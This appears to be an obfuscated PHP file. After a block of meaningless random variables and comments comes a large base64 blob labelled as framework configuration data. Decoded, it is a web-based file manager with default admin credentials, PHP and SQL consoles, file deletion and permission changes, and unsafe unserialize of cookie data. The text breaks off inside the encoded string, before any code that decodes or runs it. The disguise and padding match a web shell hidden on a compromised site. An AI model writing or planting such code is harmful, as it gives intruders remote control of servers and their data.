$u5AKBs='bzzzG8SAqc09oTQqrSCmucmN2hYxeu624oRUVP3GFljBJ7yqLF';
$TfNmKkOP9M7I='QYLJDiKTpg8V7PgKQQahqEkD6goq60Jj4TjLbSOnflK';

$GMq7rYyYf3of='0A0fNDz9nzgKFHhFvJY3fpG7FsQgYQy1YQcyk3hKzYdSunOs5UDsexz';
// qdcFcQrcJm2mgPTUBQLVceUdSrx3Mr5xjTh5mRyey0kbnMNd
$LqsxuxJLRelJ='3KpbOztGVEQkZKNTbtqsbakrrY0g6omN4mOsPsbjL21bB';

// jQmMkDraZTIaIMxMg557fp1JfmM0aEX21eBKjOsFYpdlNj7
$A6f4tOiIO='IN1h8NyQSyvYqxOjV4jz47OgG3rMGLbKci9';
// rcje9XJg8pxw8gcbOHXAJuvfpZ0QFZ2EbfYIYAFVt
$M3rxo6VtImw='AE1ofOLQ7hyLPCGdlCbG6h7Ji7sbyfki0ysXe70lzftjtKynW6E8IvrKdhTa';
$mcfBLltM4FTgXKJ='lwR2LpjEowNa7TwXoWaa1GZXhnEdv4TjEVPEracSWQ0mb6WlVRFnzV3rb';
// RRIL61iGwpk7kLfJXqsfYesTAhQxBTfTHKV6hMUMfOKYd6owibSOSC5tEW0
$AQUh6xzKlZKmrR='jyaY2RWJTWHEKEZ0iOWVJvOD2';
// OArrzV6iWz8895W1f9mTJIrLlMJ8h6KlHWXCfwEsXrY7mmsHrZV3q6MfL2qsycMayfRPiCiOuPagl
$x6GUNa4VuB='cYHbUWB3lBFDevD5GvQ43YtLDeReWnWyV7hsUBHmCLslGZF';
$WlaTWldV9Uhu='LWDuyD5Wqc20SwiEf6ZbBWzDqsZP0AbfFw6JTTy1i3ZyAgATOvi4P47Wt';

$Ey6b2lgI7BS='xTnfwCnvHqupZMWLEyiOozQ3TgzmWOuXI15shVAn';

$gP3IlkZP='PItZEKpDzLOLxj3E3K0dMd00R3LB1VoU0nhlzkJV6lyPDbIEBPOX';
// RFb9Rtm3UOKaSVWswwSZPa8gsFI12cGteSS9p0WQ
$mEgidF69NPv='VpqYMwZdnUvm8rFQXVjWtcHPefV20x6myK';

// Framework Core Configuration Data
$qf9QPOZz9Dk = 'LyogUEhQIEZpbGUgbWFuYWdlciB2ZXIgMS42ICovCgovLyBDb25maWd1cmF0aW9uIOKAlCBkbyBub3QgY2hhbmdlIG1hbnVhbGx5IQokYXV0aG9yaXphdGlvbiA9ICd7ImF1dGhvcml6ZSI6IjAiLCJsb2dpbiI6ImFkbWluIiwicGFzc3dvcmQiOiJwaHBmbSIsImNvb2tpZV9uYW1lIjoiZm1fdXNlciIsImRheXNfYXV0aG9yaXphdGlvbiI6IjMwIiwic2NyaXB0IjoiIn0nOwokcGhwX3RlbXBsYXRlcyA9ICd7IlNldHRpbmdzIjoiZ2xvYmFsICRmbV9jb25maWc7XHJcbnZhcl9leHBvcnQoJGZtX2NvbmZpZyk7IiwiQmFja3VwIFNRTCB0YWJsZXMiOiJlY2hvIGZtX2JhY2t1cF90YWJsZXMoKTsifSc7CiRzcWxfdGVtcGxhdGVzID0gJ3siQWxsIGJhc2VzIjoiU0hPVyBEQVRBQkFTRVM7IiwiQWxsIHRhYmxlcyI6IlNIT1cgVEFCTEVTOyJ9JzsKJHRyYW5zbGF0aW9uID0gJ3siaWQiOiJydSIsIkFkZCI6ItCU0L7QsdCw0LLQuNGC0YwiLCJBcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGVsZXRlIHRoaXMgZGlyZWN0b3J5IChyZWN1cnNpdmVseSk/Ijoi0JLRiyDRg9Cy0LXRgNC10L3Riywg0YfRgtC+INGF0L7RgtC40YLQtSDRg9C00LDQu9C40YLRjCDRjdGC0YMg0L/QsNC/0LrRgyAo0YDQtdC60YPRgNGB0LjQstC90L4pPyIsIkFyZSB5b3Ugc3VyZSB5b3Ugd2FudCB0byBkZWxldGUgdGhpcyBmaWxlPyI6ItCS0Ysg0YPQstC10YDQtdC90YssINGH0YLQviDRhdC+0YLQuNGC0LUg0YPQtNCw0LvQuNGC0Ywg0Y3RgtC+0YIg0YTQsNC50Ls/IiwiQXJjaGl2aW5nIjoi0JDRgNGF0LjQstC40YDQvtCy0LDRgtGMIiwiQXV0aG9yaXphdGlvbiI6ItCQ0LLRgtC+0YDQuNC30LDRhtC40Y8iLCJCYWNrIjoi0J3QsNC30LDQtCIsIkNhbmNlbCI6ItCe0YLQvNC10L3QsCIsIkNoaW5lc2UiOiLQmtC40YLQsNC50YHQutC40LkiLCJDb21wcmVzcyI6ItCh0LbQsNGC0YwiLCJDb25zb2xlIjoi0JrQvtC90YHQvtC70YwiLCJDb29raWUiOiLQmtGD0LrQuCIsIkNyZWF0ZWQiOiLQodC+0LfQtNCw0L0iLCJEYXRlIjoi0JTQsNGC0LAiLCJEYXlzIjoi0JTQvdC10LkiLCJEZWNvbXByZXNzIjoi0KDQsNGB0L/QsNC60L7QstCw0YLRjCIsIkRlbGV0ZSI6ItCj0LTQsNC70LjRgtGMIiwiRGVsZXRlZCI6ItCj0LTQsNC70LXQvdC+IiwiRG93bmxvYWQiOiLQodC60LDRh9Cw0YLRjCIsImRvbmUiOiLQt9Cw0LrQvtC90YfQtdC90LAiLCJFZGl0Ijoi0KDQtdC00LDQutGC0LjRgNC+0LLQsNGC0YwiLCJFbnRlciI6ItCS0YXQvtC0IiwiRW5nbGlzaCI6ItCQ0L3Qs9C70LjQudGB0LrQuNC5IiwiRXJyb3Igb2NjdXJyZWQiOiLQn9GA0L7QuNC30L7RiNC70LAg0L7RiNC40LHQutCwIiwiRmlsZSBtYW5hZ2VyIjoi0KTQsNC50LvQvtCy0YvQuSDQvNC10L3QtdC00LbQtdGAIiwiRmlsZSBzZWxlY3RlZCI6ItCS0YvQsdGA0LDQvSDRhNCw0LnQuyIsIkZpbGUgdXBkYXRlZCI6ItCk0LDQudC7INGB0L7RhdGA0LDQvdC10L0iLCJGaWxlbmFtZSI6ItCY0LzRjyDRhNCw0LnQu9CwIiwiRmlsZXMgdXBsb2FkZWQiOiLQpNCw0LnQuyDQt9Cw0LPRgNGD0LbQtdC9IiwiRnJlbmNoIjoi0KTRgNCw0L3RhtGD0LfRgdC60LjQuSIsIkdlbmVyYXRpb24gdGltZSI6ItCT0LXQvdC10YDQsNGG0LjRjyDRgdGC0YDQsNC90LjRhtGLIiwiR2VybWFuIjoi0J3QtdC80LXRhtC60LjQuSIsIkhvbWUiOiLQlNC+0LzQvtC5IiwiUXVpdCI6ItCS0YvRhdC+0LQiLCJMYW5ndWFnZSI6ItCv0LfRi9C6IiwiTG9naW4iOiLQm9C+0LPQuNC9IiwiTWFuYWdlIjoi0KPQv9GA0LDQstC70LXQvdC40LUiLCJNYWtlIGRpcmVjdG9yeSI6ItCh0L7Qt9C00LDRgtGMINC/0LDQv9C60YMiLCJOYW1lIjoi0J3QsNC40LzQtdC90L7QstCw0L3QuNC1IiwiTmV3Ijoi0J3QvtCy0L7QtSIsIk5ldyBmaWxlIjoi0J3QvtCy0YvQuSDRhNCw0LnQuyIsIm5vIGZpbGVzIjoi0L3QtdGCINGE0LDQudC70L7QsiIsIlBhc3N3b3JkIjoi0J/QsNGA0L7Qu9GMIiwicGljdHVyZXMiOiLQuNC30L7QsdGA0LDQttC10L3QuNGPIiwiUmVjdXJzaXZlbHkiOiLQoNC10LrRg9GA0YHQuNCy0L3QviIsIlJlbmFtZSI6ItCf0LXRgNC10LjQvNC10L3QvtCy0LDRgtGMIiwiUmVzZXQiOiLQodCx0YDQvtGB0LjRgtGMIiwiUmVzZXQgc2V0dGluZ3MiOiLQodCx0YDQvtGB0LjRgtGMINC90LDRgdGC0YDQvtC50LrQuCIsIlJlc3RvcmUgZmlsZSB0aW1lIGFmdGVyIGVkaXRpbmciOiLQktC+0YHRgdGC0LDQvdCw0LLQu9C40LLQsNGC0Ywg0LLRgNC10LzRjyDRhNCw0LnQu9CwINC/0L7RgdC70LUg0YDQtdC00LDQutGC0LjRgNC+0LLQsNC90LjRjyIsIlJlc3VsdCI6ItCg0LXQt9GD0LvRjNGC0LDRgiIsIlJpZ2h0cyI6ItCf0YDQsNCy0LAiLCJSdXNzaWFuIjoi0KDRg9GB0YHQutC40LkiLCJTYXZlIjoi0KHQvtGF0YDQsNC90LjRgtGMIiwiU2VsZWN0Ijoi0JLRi9Cx0LXRgNC40YLQtSIsIlNlbGVjdCB0aGUgZmlsZSI6ItCS0YvQsdC10YDQuNGC0LUg0YTQsNC50LsiLCJTZXR0aW5ncyI6ItCd0LDRgdGC0YDQvtC50LrQsCIsIlNob3ciOiLQn9C+0LrQsNC30LDRgtGMIiwiU2hvdyBzaXplIG9mIHRoZSBmb2xkZXIiOiLQn9C+0LrQsNC30YvQstCw0YLRjCDRgNCw0LfQvNC10YAg0L/QsNC/0LrQuCIsIlNpemUiOiLQoNCw0LfQvNC10YAiLCJTcGFuaXNoIjoi0JjRgdC/0LDQvdGB0LrQuNC5IiwiU3VibWl0Ijoi0J7RgtC/0YDQsNCy0LjRgtGMIiwiVGFzayI6ItCX0LDQtNCw0YfQsCIsInRlbXBsYXRlcyI6ItGI0LDQsdC70L7QvdGLIiwiVWtyYWluaWFuIjoi0KPQutGA0LDQuNC90YHQutC40LkiLCJVcGxvYWQiOiLQl9Cw0LPRgNGD0LfQuNGC0YwiLCJWYWx1ZSI6ItCX0L3QsNGH0LXQvdC40LUiLCJIZWxsbyI6ItCf0YDQuNCy0LXRgiIsIkZvdW5kIGluIGZpbGVzIjoi0J3QsNC50LTQtdC90L4g0LIg0YTQsNC50LvQsNGFIiwiU2VhcmNoIjoi0J/QvtC40YHQuiIsIlJlY3Vyc2l2ZSBzZWFyY2giOiAi0KDQtdC60YPRgNGB0LjQstC90YvQuSDQv9C+0LjRgdC6IiwiTWFzayI6ItCc0LDRgdC60LAifSc7Ci8vIGVuZCBjb25maWd1cmF0aW9uCgovLyBQcmVwYXJhdGlvbnMKJHN0YXJ0dGltZSA9IGV4cGxvZGUoJyAnLCBtaWNyb3RpbWUoKSk7CiRzdGFydHRpbWUgPSAkc3RhcnR0aW1lWzFdICsgJHN0YXJ0dGltZVswXTsKJGxhbmdzID0gYXJyYXkoJ2VuJywncnUnLCdkZScsJ2ZyJywndWsnKTsKJHBhdGggPSBlbXB0eSgkX1JFUVVFU1RbJ3BhdGgnXSkgPyAkcGF0aCA9IHJlYWxwYXRoKCcuJykgOiByZWFscGF0aCgkX1JFUVVFU1RbJ3BhdGgnXSk7CiRwYXRoID0gc3RyX3JlcGxhY2UoJ1xcJywgJy8nLCAkcGF0aCkgLiAnLyc7CiRtYWluX3BhdGg9c3RyX3JlcGxhY2UoJ1xcJywgJy8nLHJlYWxwYXRoKCcuLycpKTsKJHBoYXJfbWF5YmUgPSAodmVyc2lvbl9jb21wYXJlKHBocHZlcnNpb24oKSwiNS4zLjAiLCI8IikpP3RydWU6ZmFsc2U7CiRtc2cgPSAnJzsgLy8gc2VydmljZSBzdHJpbmcKJGRlZmF1bHRfbGFuZ3VhZ2UgPSAncnUnOwokZGV0ZWN0X2xhbmcgPSB0cnVlOwokZm1fdmVyc2lvbiA9IDEuNjsKCmluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgJzEnKTsKaW5pX3NldCgnZGlzcGxheV9zdGFydHVwX2Vycm9ycycsICcxJyk7CmVycm9yX3JlcG9ydGluZyhFX0FMTCk7CQkJCQkJICAgCgovL0F1dGhvcml6YXRpb24KJGF1dGggPSBqc29uX2RlY29kZSgkYXV0aG9yaXphdGlvbix0cnVlKTsKJGF1dGhbJ2F1dGhvcml6ZSddID0gaXNzZXQoJGF1dGhbJ2F1dGhvcml6ZSddKSA/ICRhdXRoWydhdXRob3JpemUnXSA6IDA7IAokYXV0aFsnZGF5c19hdXRob3JpemF0aW9uJ10gPSAoaXNzZXQoJGF1dGhbJ2RheXNfYXV0aG9yaXphdGlvbiddKSYmaXNfbnVtZXJpYygkYXV0aFsnZGF5c19hdXRob3JpemF0aW9uJ10pKSA/IChpbnQpJGF1dGhbJ2RheXNfYXV0aG9yaXphdGlvbiddIDogMzA7CiRhdXRoWydsb2dpbiddID0gaXNzZXQoJGF1dGhbJ2xvZ2luJ10pID8gJGF1dGhbJ2xvZ2luJ10gOiAnYWRtaW4nOyAgCiRhdXRoWydwYXNzd29yZCddID0gaXNzZXQoJGF1dGhbJ3Bhc3N3b3JkJ10pID8gJGF1dGhbJ3Bhc3N3b3JkJ10gOiAncGhwZm0nOyAgCiRhdXRoWydjb29raWVfbmFtZSddID0gaXNzZXQoJGF1dGhbJ2Nvb2tpZV9uYW1lJ10pID8gJGF1dGhbJ2Nvb2tpZV9uYW1lJ10gOiAnZm1fdXNlcic7CiRhdXRoWydzY3JpcHQnXSA9IGlzc2V0KCRhdXRoWydzY3JpcHQnXSkgPyAkYXV0aFsnc2NyaXB0J10gOiAnJzsKCi8vIExpdHRsZSBkZWZhdWx0IGNvbmZpZwokZm1fZGVmYXVsdF9jb25maWcgPSBhcnJheSAoCgknbWFrZV9kaXJlY3RvcnknID0+IHRydWUsIAoJJ25ld19maWxlJyA9PiB0cnVlLCAKCSd1cGxvYWRfZmlsZScgPT4gdHJ1ZSwgCgknc2hvd19kaXJfc2l6ZScgPT4gZmFsc2UsIC8vaWYgdHJ1ZSwgc2hvdyBkaXJlY3Rvcnkgc2l6ZSDihpIgbWF5YmUgc2xvdyAKCSdzaG93X2ltZycgPT4gdHJ1ZSwgCgknc2hvd19waHBfdmVyJyA9PiB0cnVlLCAKCSdzaG93X3BocF9pbmknID0+IGZhbHNlLCAvLyBzaG93IHBhdGggdG8gY3VycmVudCBwaHAuaW5pCgknc2hvd19ndCcgPT4gdHJ1ZSwgLy8gc2hvdyBnZW5lcmF0aW9uIHRpbWUKCSdlbmFibGVfcGhwX2NvbnNvbGUnID0+IHRydWUsCgknZW5hYmxlX3NxbF9jb25zb2xlJyA9PiB0cnVlLAoJJ3NxbF9zZXJ2ZXInID0+ICdsb2NhbGhvc3QnLAoJJ3NxbF91c2VybmFtZScgPT4gJ3Jvb3QnLAoJJ3NxbF9wYXNzd29yZCcgPT4gJycsCgknc3FsX2RiJyA9PiAndGVzdF9iYXNlJywKCSdlbmFibGVfcHJveHknID0+IHRydWUsCgknc2hvd19waHBpbmZvJyA9PiB0cnVlLAoJJ3Nob3dfeGxzJyA9PiB0cnVlLAoJJ2ZtX3NldHRpbmdzJyA9PiB0cnVlLAoJJ3Jlc3RvcmVfdGltZScgPT4gdHJ1ZSwKCSdmbV9yZXN0b3JlX3RpbWUnID0+IGZhbHNlLAopOwoKaWYgKGVtcHR5KCRfQ09PS0lFWydmbV9jb25maWcnXSkpICRmbV9jb25maWcgPSAkZm1fZGVmYXVsdF9jb25maWc7CmVsc2UgJGZtX2NvbmZpZyA9IHVuc2VyaWFsaXplKCRfQ09PS0lFWydmbV9jb25maWcnXSk7CgovLyBDaGFuZ2UgbGFuZ3VhZ2UKaWYgKGlzc2V0KCRfUE9TVFsnZm1fbGFuZyddKSkgeyAKCXNldGNvb2tpZSgnZm1fbGFuZycsICRfUE9TVFsnZm1fbGFuZyddLCB0aW1lKCkgKyAoODY0MDAgKiAkYXV0aFsnZGF5c19hdXRob3JpemF0aW9uJ10pKTsKCSRfQ09PS0lFWydmbV9sYW5nJ10gPSAkX1BPU1RbJ2ZtX2xhbmcnXTsKfQokbGFuZ3VhZ2UgPSAkZGVmYXVsdF9sYW5ndWFnZTsKCi8vIERldGVjdCBicm93c2VyIGxhbmd1YWdlCmlmKCRkZXRlY3RfbGFuZyAmJiAhZW1wdHkoJF9TRVJWRVJbJ0hUVFBfQUNDRVBUX0xBTkdVQUdFJ10pICYmIGVtcHR5KCRfQ09PS0lFWydmbV9sYW5nJ10pKXsKCSRsYW5nX3ByaW9yaXR5ID0gZXhwbG9kZSgnLCcsICRfU0VSVkVSWydIVFRQX0FDQ0VQVF9MQU5HVUFHRSddKTsKCWlmICghZW1wdHkoJGxhbmdfcHJpb3JpdHkpKXsKCQlmb3JlYWNoICgkbGFuZ19wcmlvcml0eSBhcyAkbGFuZ19hcnIpewoJCQkkbG5nID0gZXhwbG9kZSgnOycsICRsYW5nX2Fycik7CgkJCSRsbmcgPSAkbG5nWzBdOwoJCQlpZihpbl9hcnJheSgkbG5nLCRsYW5ncykpewoJCQkJJGxhbmd1YWdlID0gJGxuZzsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJfQp9IAoKLy8gQ29va2llIGxhbmd1YWdlIGlzIHByaW1hcnkgZm9yIGV2ZXIKJGxhbmd1YWdlID0gKGVtcHR5KCRfQ09PS0lFWydmbV9sYW5nJ10pKSA/ICRsYW5ndWFnZSA6ICRfQ09PS0lFWydmbV9sYW5nJ107CgovLyBMb2NhbGl6YXRpb24KJGxhbmcgPSBqc29uX2RlY29kZSgkdHJhbnNsYXRpb24sdHJ1ZSk7CmlmICgkbGFuZ1snaWQnXSE9JGxhbmd1YWdlKSB7CgkkZ2V0X2xhbmcgPSBmaWxlX2dldF9jb250ZW50cygnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RlbjF4eHgvRmlsZW1hbmFnZXIvbWFzdGVyL2xhbmd1YWdlcy8nIC4gJGxhbmd1YWdlIC4gJy5qc29uJyk7CglpZiAoIWVtcHR5KCRnZXRfbGFuZykpIHsKCQkvL3JlbW92ZSB1bm5lY2Vzc2FyeSBjaGFyYWN0ZXJzCgkJJHRyYW5zbGF0aW9uX3N0cmluZyA9IHN0cl9yZXBsYWNlKCInIiwnJiMzOTsnLGpzb25fZW5jb2RlKGpzb25fZGVjb2RlKCRnZXRfbGFuZyksSlNPTl9VTkVTQ0FQRURfVU5JQ09ERSkpOwoJCSRmZ2MgPSBmaWxlX2dldF9jb250ZW50cyhfX0ZJTEVfXyk7CgkJJHNlYXJjaCA9IHByZWdfbWF0Y2goJyN0cmFuc2xhdGlvbltcc10/XD1bXHNdP1wnXHtcIiguKj8pXCJcfVwnOyMnLCAkZmdjLCAkbWF0Y2hlcyk7CgkJaWYgKCFlbXB0eSgkbWF0Y2hlc1sxXSkpIHsKCQkJJGZpbGVtdGltZSA9IGZpbGVtdGltZShfX0ZJTEVfXyk7CgkJCSRyZXBsYWNlID0gc3RyX3JlcGxhY2UoJ3siJy4kbWF0Y2hlc1sxXS4nIn0nLCR0cmFuc2xhdGlvbl9zdHJpbmcsJGZnYyk7CgkJCWlmIChmaWxlX3B1dF9jb250ZW50cyhfX0ZJTEVfXywgJHJlcGxhY2UpKSB7CgkJCQkkbXNnIC49IF9fKCdGaWxlIHVwZGF0ZWQnKTsKCQkJfQllbHNlICRtc2cgLj0gX18oJ0Vycm9yIG9jY3VycmVkJyk7CgkJCWlmICghZW1wdHkoJGZtX2NvbmZpZ1snZm1fcmVzdG9yZV90aW1lJ10pKSB0b3VjaChfX0ZJTEVfXywkZmlsZW10aW1lKTsKCQl9CQoJCSRsYW5nID0ganNvbl9kZWNvZGUoJHRyYW5zbGF0aW9uX3N0cmluZyx0cnVlKTsKCX0KfQoKLyogRnVuY3Rpb25zICovCgovL3RyYW5zbGF0aW9uCmZ1bmN0aW9uIF9fKCR0ZXh0KXsKCWdsb2JhbCAkbGFuZzsKCWlmIChpc3NldCgkbGFuZ1skdGV4dF0pKSByZXR1cm4gJGxhbmdbJHRleHRdOwoJZWxzZSByZXR1cm4gJHRleHQ7Cn07CgovL2RlbGV0ZSBmaWxlcyBhbmQgZGlycyByZWN1cnNpdmVseQpmdW5jdGlvbiBmbV9kZWxfZmlsZXMoJGZpbGUsICRyZWN1cnNpdmUgPSBmYWxzZSkgewoJaWYoJHJlY3Vyc2l2ZSAmJiBAaXNfZGlyKCRmaWxlKSkgewoJCSRlbHMgPSBmbV9zY2FuX2RpcigkZmlsZSwgJycsICcnLCB0cnVlKTsKCQlmb3JlYWNoICgkZWxzIGFzICRlbCkgewoJCQlpZigkZWwgIT0gJy4nICYmICRlbCAhPSAnLi4nKXsKCQkJCWZtX2RlbF9maWxlcygkZmlsZSAuICcvJyAuICRlbCwgdHJ1ZSk7CgkJCX0KCQl9Cgl9CglpZihAaXNfZGlyKCRmaWxlKSkgewoJCXJldHVybiBybWRpcigkZmlsZSk7Cgl9IGVsc2UgewoJCXJldHVybiBAdW5saW5rKCRmaWxlKTsKCX0KfQoKLy9maWxlIHBlcm1zCmZ1bmN0aW9uIGZtX3JpZ2h0c19zdHJpbmcoJGZpbGUsICRpZiA9IGZhbHNlKXsKCSRwZXJtcyA9IGZpbGVwZXJtcygkZmlsZSk7CgkkaW5mbyA9ICcnOwoJaWYoISRpZil7CgkJaWYgKCgkcGVybXMgJiAweEMwMDApID09IDB4QzAwMCkgewoJCQkvL1NvY2tldAoJCQkkaW5mbyA9ICdzJzsKCQl9IGVsc2VpZiAoKCRwZXJtcyAmIDB4QTAwMCkgPT0gMHhBMDAwKSB7CgkJCS8vU3ltYm9saWMgTGluawoJCQkkaW5mbyA9ICdsJzsKCQl9IGVsc2VpZiAoKCRwZXJtcyAmIDB4ODAwMCkgPT0gMHg4MDAwKSB7CgkJCS8vUmVndWxhcgoJCQkkaW5mbyA9ICctJzsKCQl9IGVsc2VpZiAoKCRwZXJtcyAmIDB4NjAwMCkgPT0gMHg2MDAwKSB7CgkJCS8vQmxvY2sgc3BlY2lhbAoJCQkkaW5mbyA9ICdiJzsKCQl9IGVsc2VpZiAoKCRwZXJtcyAmIDB4NDAwMCkgPT0gMHg0MDAwKSB7CgkJCS8vRGlyZWN0b3J5CgkJCSRpbmZvID0gJ2QnOwoJCX0gZWxzZWlmICgoJHBlcm1zICYgMHgyMDAwKSA9PSAweDIwMDApIHsKCQkJLy9DaGFyYWN0ZXIgc3BlY2lhbAoJCQkkaW5mbyA9ICdjJzsKCQl9IGVsc2VpZiAoKCRwZXJtcyAmIDB4MTAwMCkgPT0gMHgxMDAwKSB7CgkJCS8vRklGTyBwaXBlCgkJCSRpbmZvID0gJ3AnOwoJCX0gZWxzZSB7CgkJCS8vVW5rbm93bgoJCQkkaW5mbyA9ICd1JzsKCQl9Cgl9CiAgCgkvL093bmVyCgkkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDEwMCkgPyAncicgOiAnLScpOwoJJGluZm8gLj0gKCgkcGVybXMgJiAweDAwODApID8gJ3cnIDogJy0nKTsKCSRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDQwKSA/CgkoKCRwZXJtcyAmIDB4MDgwMCkgPyAncycgOiAneCcgKSA6CgkoKCRwZXJtcyAmIDB4MDgwMCkgPyAnUycgOiAnLScpKTsKIAoJLy9Hcm91cAoJJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMjApID8gJ3InIDogJy0nKTsKCSRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDEwKSA/ICd3JyA6ICctJyk7CgkkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAwOCkgPwoJKCgkcGVybXMgJiAweDA0MDApID8gJ3MnIDogJ3gnICkgOgoJKCgkcGVybXMgJiAweDA0MDApID8gJ1MnIDogJy0nKSk7CiAKCS8vV29ybGQKCSRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDA0KSA/ICdyJyA6ICctJyk7CgkkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAwMikgPyAndycgOiAnLScpOwoJJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDEpID8KCSgoJHBlcm1zICYgMHgwMjAwKSA/ICd0JyA6ICd4JyApIDoKCSgoJHBlcm1zICYgMHgwMjAwKSA/ICdUJyA6ICctJykpOwoKCXJldHVybiAkaW5mbzsKfQoKZnVuY3Rpb24gZm1fY29udmVydF9yaWdodHMoJG1vZGUpIHsKCSRtb2RlID0gc3RyX3BhZCgkbW9kZSw5LCctJyk7CgkkdHJhbnMgPSBhcnJheSgnLSc9PicwJywncic9Pic0Jywndyc9PicyJywneCc9PicxJyk7CgkkbW9kZSA9IHN0cnRyKCRtb2RlLCR0cmFucyk7CgkkbmV3bW9kZSA9ICcwJzsKCSRvd25lciA9IChpbnQpICRtb2RlWzBdICsgKGludCkgJG1vZGVbMV0gKyAoaW50KSAkbW9kZVsyXTsgCgkkZ3JvdXAgPSAoaW50KSAkbW9kZVszXSArIChpbnQpICRtb2RlWzRdICsgKGludCkgJG1vZGVbNV07IAoJJHdvcmxkID0gKGludCkgJG1vZGVbNl0gKyAoaW50KSAkbW9kZVs3XSArIChpbnQpICRtb2RlWzhdOyAKCSRuZXdtb2RlIC49ICRvd25lciAuICRncm91cCAuICR3b3JsZDsKCXJldHVybiBpbnR2YWwoJG5ld21vZGUsIDgpOwp9CgpmdW5jdGlvbiBmbV9jaG1vZCgkZmlsZSwgJHZhbCwgJHJlYyA9IGZhbHNlKSB7CgkkcmVzID0gQGNobW9kKHJlYWxwYXRoKCRmaWxlKSwgJHZhbCk7CglpZihAaXNfZGlyKCRmaWxlKSAmJiAkcmVjKXsKCQkkZWxzID0gZm1fc2Nhbl9kaXIoJGZpbGUpOwoJCWZvcmVhY2ggKCRlbHMgYXMgJGVsKSB7CgkJCSRyZXMgPSAkcmVzICYmIGZtX2NobW9kKCRmaWxlIC4gJy8nIC4gJGVsLCAkdmFsLCB0cnVlKTsKCQl9Cgl9CglyZXR1cm4gJHJlczsKfQoKLy9sb2FkIGZpbGVzCmZ1bmN0aW9uIGZtX2Rvd25sb2FkKCRmaWxlX25hbWUpIHsKICAgIGlmICghZW1wdHkoJGZpbGVfbmFtZSkpIHsKCQlpZiAoZmlsZV9leGlzdHMoJGZpbGVfbmFtZSkpIHsKCQkJaGVhZGVyKCJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0iIC4gYmFzZW5hbWUoJGZpbGVfbmFtZSkpOyAgIAoJCQloZWFkZXIoIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vZm9yY2UtZG93bmxvYWQiKTsKCQkJaGVhZGVyKCJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSIpOwoJCQloZWFkZXIoIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vZG93bmxvYWQiKTsKCQkJaGVhZGVyKCJDb250ZW50LURlc2NyaXB0aW9uOiBGaWxlIFRyYW5zZmVyIik7ICAgICAgICAgICAgCgkJCWhlYWRlcigiQ29udGVudC1MZW5ndGg6ICIgLiBmaWxlc2l6ZSgkZmlsZV9uYW1lKSk7CQkKCQkJZmx1c2goKTsgLy8gdGhpcyBkb2Vzbid0IHJlYWxseSBtYXR0ZXIuCgkJCSRmcCA9IGZvcGVuKCRmaWxlX25hbWUsICJyIik7CgkJCXdoaWxlICghZmVvZigkZnApKSB7CgkJCQllY2hvIGZyZWFkKCRmcCwgNjU1MzYpOwoJCQkJZmx1c2goKTsgLy8gdGhpcyBpcyBlc3NlbnRpYWwgZm9yIGxhcmdlIGRvd25sb2FkcwoJCQl9IAoJCQlmY2xvc2UoJGZwKTsKCQkJZGllKCk7CgkJfSBlbHNlIHsKCQkJaGVhZGVyKCdIVFRQLzEuMCA0MDQgTm90IEZvdW5kJywgdHJ1ZSwgNDA0KTsKCQkJaGVhZGVyKCdTdGF0dXM6IDQwNCBOb3QgRm91bmQnKTsgCgkJCWRpZSgpOwogICAgICAgIH0KICAgIH0gCn0KCi8vc2hvdyBmb2xkZXIgc2l6ZQpmdW5jdGlvbiBmbV9kaXJfc2l6ZSgkZiwkZm9ybWF0PXRydWUpIHsKCWlmKCRmb3JtYXQpICB7CgkJJHNpemU9Zm1fZGlyX3NpemUoJGYsZmFsc2UpOwoJCWlmKCRzaXplPD0xMDI0KSByZXR1cm4gJHNpemUuJyBieXRlcyc7CgkJZWxzZWlmKCRzaXplPD0xMDI0KjEwMjQpIHJldHVybiByb3VuZCgkc2l6ZS8oMTAyNCksMikuJyZuYnNwO0tiJzsKCQllbHNlaWYoJHNpemU8PTEwMjQqMTAyNCoxMDI0KSByZXR1cm4gcm91bmQoJHNpemUvKDEwMjQqMTAyNCksMikuJyZuYnNwO01iJzsKCQllbHNlaWYoJHNpemU8PTEwMjQqMTAyNCoxMDI0KjEwMjQpIHJldHVybiByb3VuZCgkc2l6ZS8oMTAyNCoxMDI0KjEwMjQpLDIpLicmbmJzcDtHYic7CgkJZWxzZWlmKCRzaXplPD0xMDI0KjEwMjQqMTAyNCoxMDI0KjEwMjQpIHJldHVybiByb3VuZCgkc2l6ZS8oMTAyNCoxMDI0KjEwMjQqMTAyNCksMikuJyZuYnNwO1RiJzsgLy86KSkpCgkJZWxzZSByZXR1cm4gcm91bmQoJHNpemUvKDEwMjQqMTAyNCoxMDI0KjEwMjQqMTAyNCksMikuJyZuYnNwO1BiJzsgLy8gOy0pCgl9IGVsc2UgewoJCWlmKGlzX2ZpbGUoJGYpKSByZXR1cm4gZmlsZXNpemUoJGYpOwoJCSRzaXplPTA7CgkJJGRoPW9wZW5kaXIoJGYpOwoJCXdoaWxlKCgkZmlsZT1yZWFkZGlyKCRkaCkpIT09ZmFsc2UpIHsKCQkJaWYoJGZpbGU9PScuJyB8fCAkZmlsZT09Jy4uJykgY29udGludWU7CgkJCWlmKGlzX2ZpbGUoJGYuJy8nLiRmaWxlKSkgJHNpemUrPWZpbGVzaXplKCRmLicvJy4kZmlsZSk7CgkJCWVsc2UgJHNpemUrPWZtX2Rpcl9zaXplKCRmLicvJy4kZmlsZSxmYWxzZSk7CgkJfQoJCWNsb3NlZGlyKCRkaCk7CgkJcmV0dXJuICRzaXplK2ZpbGVzaXplKCRmKTsgCgl9Cn0KCi8vc2NhbiBkaXJlY3RvcnkKZnVuY3Rpb24gZm1fc2Nhbl9kaXIoJGRpcmVjdG9yeSwgJGV4cCA9ICcnL